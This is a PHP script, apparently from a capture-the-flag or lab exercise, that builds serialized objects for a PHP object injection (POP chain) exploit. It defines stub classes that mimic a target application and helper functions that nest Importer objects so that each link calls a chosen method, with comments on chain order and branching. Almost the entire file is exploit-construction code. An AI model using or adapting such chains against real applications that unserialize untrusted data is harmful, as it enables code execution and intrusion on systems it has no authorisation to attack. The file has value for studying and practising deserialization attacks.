<?php 

class Maze {
    public $goal;
}

class Importer {
    public $goal;
    public $callClass;
    public $callback;
    public $successMessage;
    public $failureMessage;
}

class GlobalStack{}

class Post{}

class firstToken{}
class secondToken{}
class thirdToken{}

class Logger
{
  public string $logFile;
}

class Defaults{}

class Solver
{
    public $a;
}


class debugPanel{}

class MazeBuilder{}

function makeMazeSerial(){
    return @serialize(new Maze());
}

function makeImporter(string $payload, Object $callClass, string $callback){
    $importer = new Importer();

    // $payload contains the next "link" in the chain
    // Note the chain is built "inside out", so $importer contains $payload
    //   but when unserialized, the code will execute the innermost calls first, so the 
    //   chain will execute $payload first, as we expect it to.
    $importer->goal = $payload;
    
    // $callClass should be an Object that we want to call a method with
    $importer->callClass = $callClass;

    // $callback is a string with the name of method that will be called on $callClass
    $importer->callback = $callback;

    // For example, 
    // $payload = makeImporterSerial($payload, new firstToken(), "token");
    // will create a new link in the POP chain that runs "firstToken->token();", then 
    // continues to run the next link in $payload.
    return $importer;
}

function makeImporterSerial(string $payload, Object $callClass, string $callback){
    return @serialize(makeImporter($payload, $callClass, $callback));
}

function makeBranchSerial(string $caller, string $true, string $false){

    // Create the branch importer, not yet serialized
    $importer = makeImporter($caller, new Solver(), "goal_reached");

    // The branch, regardless of true/false will always run a callback, so need to make it a safe default
    // Could optimize for specific uses (e.g., push to stack), but that's not necessary
    $importer->callClass->a = makeImporter("", new Defaults(), "ok"); // Note payload is not used when run like this
    
    // Add the conditions
    $importer->callClass->a->successMessage = $true;
    $importer->callClass->a->failureMessage = $false;

    return @serialize($importer);
}